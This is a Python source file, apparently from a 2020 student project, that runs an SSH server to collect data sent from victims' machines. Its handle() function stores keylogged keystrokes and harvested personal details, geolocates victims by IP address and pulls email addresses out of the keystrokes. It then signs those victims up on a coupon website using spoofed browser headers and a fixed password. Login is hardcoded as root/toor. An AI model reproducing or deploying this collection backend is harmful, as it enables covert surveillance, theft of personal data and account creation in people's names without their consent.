# test_daemon.py

#==============================================================================
 #   Assignment:  Major Project - A&W Coupon App
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Apr 15th 2020 
 #    Submitted: Apr 15th 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program acts as a paramiko server. It manages and handles the connections of inbound clients. It accepts incoming commands from the clients
 #                       and as directed will move to signup the target for the coupon list or will store keylogged information that was stolen from the user.
 #                       It will handle multiple connections at once and is multi-threaded.
 #                       The scraper will pretend to be a browser by using a header that captures a session cookie and adds a token + session key to the payload  
 #      
 #        Input:  start|stop|restart
 #
 #       Output:  Outputs connection and health to console and logFiles
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage an SSH server. Continously await connections from client targets in a non-blocking manner
 #                       
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  Children spawned from handling clients do not appear to be handeld by the sigChild terminator function and are possibly still running as zombies
 #      
 #
 #   Classification: N/A
 #
#==============================================================================

import json
import errno
import random
import os
import time
import atexit
import logzero
from logzero import logger
from signal import SIGTERM
import socket
import paramiko
from bs4 import BeautifulSoup
import requests
import threading
import sys
import signal
import re
#---------__Change As Required__-----------#
binds = ("::1",  9500) 
cwd = os.path.dirname(os.path.realpath(sys.argv[0])) # current working directory for work after daemonizing
keyLoc = cwd
keyLoc +=  '/test_rsa.key' 
host_key = paramiko.RSAKey(filename=keyLoc)

#-----------------------------------------#

def soup(email='unknown',  firstName='friendly',  lastName='user',  postalCode = 'k7k2k1'):
    ''''
    This function represents the automated registration component of the application
    It will scrape the target webpage and will sign the user up for it while imitiating a browser.
    The scraper will pretent to be a browser by using a header that captures a session cookie and adds a token + session key to the payload
    Data that is not received will be randomly generated(except for the pwd = "P@ssw0rd" and email)
    
    @Author: Alistair
    @Date: April 8th 2020
    
    @param - dataLine list - the list of user provided data to submit
    @Requires - BS4, Logger, requests, sys
    '''
    if email == 'unknown':
        logger.error("Required arguement email not provided")
        return -1
    page  = requests.get("https://awcoupon.ca/en/register")
    logger.info("======STARTING REGISTRATION======")
    if page.status_code != 200:
        logger.error("Cannot Locate the target coupon server")
        print("Cannot Locate the target server")
        return -1 #Failed to make some soup
    
    soup = BeautifulSoup(page.content,  'html.parser')
    logger.info("Found target! Extracting Form...")
    
    #Extract the target registration form
    token = (soup.find('input',  {'name' : '_token'}).get('value'))
    session_key = (soup.find('input',  {'name' : '_session_key'}).get('value'))
    
    #The operational target
    targetURL = "https://awcoupon.ca/en/register"
    
    #Find the cookies of a real browser
    cookieJar = page.cookies
    cookie_ = page.cookies['october_session']
    cookie = 'october_session=' + cookie_
    logger.info("Setting Target Cookie as:" + cookie) #I'm a real browser now
    
    #Header(What data must be imitated)
    headers = {
        'Host' : 'awcoupon.ca', 
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
        'Accept': '*/*', 
        'Accept-Language': 'en-US,en;q=0.5', 
        'Accept-Encoding' :'gzip, deflate, br', 
        'Referer': 'https://awcoupon.ca/en/register', 
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
        'X-OCTOBER-REQUEST-HANDLER': 'onRegister', 
        'X-OCTOBER-REQUEST-PARTIALS': '', 
        'X-OCTOBER-REQUEST-FLASH': '1', 
        'X-Requested-With': 'XMLHttpRequest', 
        'Content-Length': '281', 
        'Cookie': cookie, 
        'Connection': 'keep-alive', 
    }
    #POST response form (data is brough to the target)
    response = {
    '_session_key' :  session_key, #yanked from the webpage
    '_token' : token,  #yanked from the webpage
    'name': firstName + ' ' + lastName, 
    'email': email, 
    'profile[postal_code]': postalCode, 
    'password': 'P@ssw0rd', 
    'password_confirmation': 'P@ssw0rd', 
    'profile[user_region]' : '', 
    'profile[lang]': 'en'
    
    }
    logger.info("Header & Response created!")
    
    #POST reqeust to target
    logger.info("Attempting registration...")
    test_response = requests.post(targetURL,  data=response,  headers=headers,  cookies=cookieJar)
    
    #Fetch result
    result = BeautifulSoup(test_response.text,  'html.parser')
    #200 = OK(probably) and anything else needs logged.
    if(test_response.status_code != 200):
        logger.error("User could not be registered. Response code was: " + str(test_response.status_code))
        logger.error("Error was:" + test_response.text)
        logger.info("======ENDING REGISTRATION======")
        return -1
    
    logger.info("Registered the user! :p")
    logger.info("======ENDING REGISTRATION======")
    return 0
def child():
    childWrites="in child"
    logger.info(f"Child: {os.getpid()} {childWrites} ")

def parent():
    logger.info(f"Parent: {os.getpid()} is logging")
    
def sigterm_handler(signo,  frame):
    ''''
    This function handles the cleanup of the parent daemon when the stop command is passed
    param - sigNo 
    param - frames
    return - exit state
    '''
    raise  SystemExit(1)
    
def grimReaper(signalNumber,frame):
    
   while True:
        try:
            pid,status=os.waitpid(-1,os.WNOHANG)
        except OSError:
            return
        
        if pid==0:
            return
         
def exitErr(msg,status=1):
   print(msg)
   sys.exit(status)
   
def getPid(pidfile,default=None):
    try:
        with open(pidfile) as f:
            return int(f.read().strip())
    except IOError:
        return default

class Daemon(object):
    def __init__(self, pidfile,stdin='/dev/null',stdout='/dev/null',stderr='/dev/null'):
          self.stdin=stdin
          self.stdout=stdout
          self.stderr=stderr
          self.pidfile=pidfile
          
    def delpid(self):
        try:
            os.remove(self.pidfile)
        except Exception:
            pass
   
    def startService(self,  stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
        ''''
        This function handles the intiial setup needed in order to start or stop the Daemon. 
        For stopping the program, it will find the PID file and remove it. Then, it will exit the daemon.
        For starting the program, it will check for an existing PID file and if not available, writes one and double forks to generate a daemonized daemon.
        Function will log as needed to the logfile which exist next to the file that was executed as dpi912logFile
        '''
        pidFile = '/var/run/daemon/daemon.pid'  #instead of /var/run/ which requires root, which I dont have the pwd for.
        self.pidfile= pidFile
        #if init start is passed, start the server
        
        if 'start'==sys.argv[1]:
            print("Attempting to start on ipv6 localhost via socket "+str(binds) +"- see logs for further information")
            if os.path.exists(pidFile):
                logger.warning("Daemon PID File exists, is this Daemon already running? Exiting...")
                sys.exit(0)
            else:
                try:
                    if os.fork() > 0:
                        raise SystemExit(0)
                except OSError as e:
                    logger.error("Unable to fork for fork #1")
                
                os.chdir('/var/run/daemon')
                try:
                    os.setsid()
                    os.setuid(1000) #so how exactly does this become root if you must be root to set this privilage?
                except Exception as e:
                    logger.warning("Could not change the GID and/or UID - is this process privilaged?")
                    logger.warning(str(e))
                    
                # End Leadership by double forking
                try:
                    if os.fork() > 0:
                        raise SystemExit(0)
                except OSError as e:
                    logger.error("Unable to fork for fork #2")
                    
                # Flush I/O  buffers  and lockdown stderr/out/in
                sys.stdout.flush() 
                sys.stderr.flush()
                
                with open(pidFile,'w')  as f:
                    print(os.getpid(),file=f)
                    
                self.pidfile= pidFile
                # PID is to be removed when this daemon stops
                atexit.register(lambda:  self.delpid())
                signal.signal(signal.SIGTERM,  sigterm_handler)
        

    def start(self):
        if getPid(self.pidfile):
            print("PID Exists - remove it")
            logger.info("pidfile exists. deamon is running")
        self.startService(self)
        self.run()
   
    def stop(self):
        pid=getPid(self.pidfile)
        if not pid:
            print("PID doesnt exist")
            logger.info("pidfile dont exist. deamon not running")
            return
        try:
            while True:
                os.kill(pid, SIGTERM)
                time.sleep(0.1)
        except OSError as e:
            error=e.strerror
            if 'No such process' in error:
                if os.path.exists(self.pidfile):
                    os.remove(self.pidfile)
            else:
                exitErr(error)

    def restart(self):
        self.stop()
        self.start()
   
    def run(self):
        print("Error - Invoked Base class RUN")
            
   
def startParamiko(client):
  return -1
  
def endConnection(sigNo, frames):
    '''
    This function handles the cleanup of zombie children after their work has been completed
    param - sigNo 
    param - frames
    return - exit state
    '''
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG) #any child must be ended
        except Exception:
            return -1
        if pid == 0:
            return 1
        
class MyDaemon(Daemon):
   def run(self):
    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        sock.bind(binds)
        signal.signal(signal.SIGCHLD,endConnection) #estabish a zombie child killer
        
    except Exception as e:
        print("*** Bind failed: " + str(e))
        e.print_exc()
        sys.exit(1)
        
    #double fork
    try:
        sock.listen(100)
        print("Listening for connection ...")
        logger.info("Listening for connection...")
    except Exception as e:
            print("*** Listen/accept failed: " + str(e))
            traceback.print_exc()
            sys.exit(1)
    while True:
        #loop and fork per client request
        print("Waiting...")

        client, addr = sock.accept()
        pid = os.fork()
        if pid == 0:
            print("Got a connection!")
            t = paramiko.Transport(client)
            
            t.add_server_key(host_key)
            server = Server()
            try:
                t.start_server(server=server)
            except paramiko.SSHException:
                print("*** SSH negotiation failed.")
                sys.exit(1)
            # wait for auth
            clientCon = t.accept(20)
            if clientCon is None:
                print("*** No channel ***")
                sys.exit(1)
            print("Authenticated!")
            print("Handling this connection...")

            handle(clientCon)
            clientCon.close()
            client.close()
            os._exit(0)


def handle(conn): #accpet keylogged info and save it to files
    chan = conn
    request = chan.recv(1024).decode()
    logger.info("Client said this ->" + str(request))
    print("Client said this ->" + str(request))
    print(str(request))
    
    #we check to see if were being sent the keylogged data or a string that the user entered
    #if its a string from the user, we add it to a csv with all other harvested info
    if request=='infobank.txt':
        info=chan.recv(1024).decode('utf-8')
        seperated=info.split('|')
        with open(cwd+'/peoplesInfo.csv', 'a',  newline='') as writer:
            for x in range(len(seperated)):
                if len(seperated[x])>1:
                    writer.write(seperated[x])
                    newlist=seperated[x].split(',')
                    response=requests.get("http://ip-api.com/json/%s"%(newlist[6])) #use ip-api.com's api to look up ip address and harvest more info like latitude/longitude
                    if  response.status_code==200:#if ip-api runs successfully save the results into another csv
                        txt=json.dumps(response.json())
                        print(txt)
                        writer.write(txt)
                    newlist=seperated[x].split(',')
                    soup(newlist[0], newlist[1], newlist[2], newlist[3])
    elif request=='keylog.txt':#if its a keylogged file just accept the file
        info2=chan.recv(2048).decode('utf-8')
        print("logging data")
        info2=str(info2)
        with open(cwd+'/keyLoggedData.txt', 'a',  newline='') as writer:
                writer.write(info2)
        #search through the key logger to find an email and save it to the csv
        email=re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", info2)
        for email in email:
            soup(email)
            with open(cwd+'/peoplesInfo.csv', 'a',  newline='') as writer:
                write.write(email)
    try:
        conn.close()
    except:
        pass
        
    return 0
    
    
class Server (paramiko.ServerInterface):
    host_key = paramiko.RSAKey(filename=keyLoc)
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'root') and (password == 'toor'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


# MAIN #
if __name__=="__main__":
    logzero.logfile(cwd+"/serverLogs.log",maxBytes=1e6, backupCount=3, disableStderrLogger=True)
    daemonPid=os.getpid()
    logger.info(f"Started {daemonPid}")
    daemon=MyDaemon('/var/run/daemon/daemon.pid')
    if len(sys.argv)==2:
        if 'start'==sys.argv[1]:
            daemon.stop()
            daemon.start()
        elif 'stop'==sys.argv[1]:
                daemon.stop()
        elif 'restart'==sys.argv[1]:
            daemon.restart()
        else:
            print('command not recognized')
            sys.exit(2)
        sys.exit(0)
    else:
        print('usage: %s start|stop|restart'%sys.argv[0])
        sys.exit(2)
